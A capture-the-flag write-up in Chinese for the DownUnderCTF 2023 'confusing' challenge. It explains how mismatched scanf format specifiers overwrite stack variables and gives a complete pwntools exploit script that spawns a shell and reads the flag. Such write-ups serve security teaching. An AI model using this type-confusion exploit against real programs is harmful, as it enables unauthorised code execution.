# DownUnderCTF 2023 confusing Writeup

## 题目简述

程序依次读取 `short d`、`char s[4]` 和 `double f`，但三个 `scanf` 的格式说明符全都与目标变量类型不匹配：`%lf` 写入 `short`，`%d` 写入字符数组，`%8s` 写入 `double`。目标是利用这些错配同时满足 `d == 13337`、`z == -1`、`s == "FLAG"` 和 `f == 1.6180339887`，从而进入 `/bin/sh`。

## 解题过程

第一次 `%lf` 会从 `&d` 开始写 8 字节。根据二进制的栈布局，前 2 字节对应 `d`，之后 4 字节覆盖未初始化的 `z`。因此先构造目标字节串，再把它解释为一个可被 `scanf` 接受的双精度数：

```python
p16(13337) + b"\xff\xff\xff\xff\xff\xfe"
```

其中偏移 2 到 5 的四个 `0xff` 令 `z == -1`。第二次 `%d` 会把十进制整数的 32 位表示写入 `s`，所以发送 `u32(b"FLAG")`。最后 `%8s` 会把原始输入字节写进 `double f`，直接发送目标浮点数的 8 字节 IEEE 754 表示即可。

完整的本地利用脚本如下：

```python
from pwn import *
import struct

io = process("./confusing")

first_bytes = p16(13337) + b"\xff\xff\xff\xff\xff\xfe"
first_value = struct.unpack("d", first_bytes)[0]
io.sendlineafter(b"Give me d: ", str(first_value).encode())

io.sendlineafter(b"Give me s: ", str(u32(b"FLAG")).encode())
io.sendlineafter(b"Give me f: ", struct.pack("d", 1.6180339887))

io.sendline(b"cat flag.txt")
io.interactive()
```

获得 shell 后读取：

```text
DUCTF{typ3_c0nfus1on_c4n_b3_c0nfus1ng!}
```

## 方法总结

格式说明符决定 `scanf` 写入多少字节、如何解释输入，变量声明本身不会阻止越界写入。本题需要结合反编译后的栈偏移设计三个输入：第一次覆盖相邻变量，第二次利用整数的小端表示，第三次把目标浮点数作为原始字节写入。
